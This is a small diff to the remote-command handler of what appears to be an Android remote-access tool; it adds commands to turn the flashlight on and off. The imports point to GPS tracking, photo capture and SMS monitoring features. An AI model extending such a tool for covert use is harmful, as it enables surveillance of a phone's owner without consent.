@@ -31,6 +31,7 @@ import my.app.Library.GPSListener;
 import my.app.Library.PhotoTaker;
 import my.app.Library.SMSLister;
 import my.app.Library.SMSMonitor;
+import my.app.Library.Torch;
 import inout.Protocol;
 
 /**
@@ -320,6 +321,15 @@ public class ProcessCommand
 			long duration = arguments.getLong();
 			v.vibrate(duration);
 
+		}
+		else if(commande == Protocol.TORCH){
+			client.torch = new Torch(client);
+			if (!client.torch.turnOnFlash()){
+				client.sendError("No Flash aviable");
+			}
+		}
+		else if(commande == Protocol.STOP_TORCH){
+			client.torch.turnOffFlash();
 		}
 		/**
 		 * Mit dem Befehl DISCONNECT wird der Service client zerstört und somit das Programm beendet.
